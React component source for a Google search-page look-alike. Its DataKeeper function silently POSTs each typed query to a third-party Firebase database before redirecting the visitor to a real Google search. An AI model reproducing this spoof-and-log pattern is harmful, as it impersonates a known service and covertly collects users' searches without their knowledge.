import React from 'react';
import Classnames from './googleSearchSection.module.css';
import GoogleLogo from '../../components/googleLogo/googleLogo';
import SearchingInput from './searchingInput/searchingInput';
import ButtonDiv from './buttomDiv/buttonDiv';
import Languages from './languagesDiv/languagesDiv';
import axios from 'axios';


class GoogleSearchSection extends React.Component {
    state = {
        query: "",
        url: '',
    }

    DataKeeper=()=>{
        
        let text={query:`${this.state.query}`}
        axios.post("https://gdummypage777.firebaseio.com/results.json",text)
        .then(response => {
            console.log(response);

        window.location.href = this.state.url;
        }).catch(error => {
            console.log(error);
        });
    }

    hideVirtualKeyboard () {
        if (
          document.activeElement &&
          document.activeElement.blur &&
          typeof document.activeElement.blur === 'function'
        ) {
          document.activeElement.blur()
        }
      }

    handleChange = (event) => {
        this.setState({ query: event.target.value }, () => {
            this.setState({ url: `https://www.google.com/search?q=${this.state.query}` }, () => {
            });
        });
    }

    SearchClicked=()=>{
            this.DataKeeper();
    }
    keyPressed=(event)=> {
        if (event.key === 'Enter') {
            
            this.setState({ url: `https://www.google.com/search?q=${this.state.query}` }, () => {
            });
            this.hideVirtualKeyboard ();
            this.DataKeeper();
        }
      }
    render() {
        return (
            <div className={Classnames.SearchingSection}>
                <GoogleLogo />
                <SearchingInput keyPressed={this.keyPressed} value={this.state.query} handleChange={this.handleChange}  />
                <ButtonDiv url={this.state.url} SearchClicked={this.SearchClicked}/>
                <Languages />
            </div>
            )
    }
}
export default GoogleSearchSection;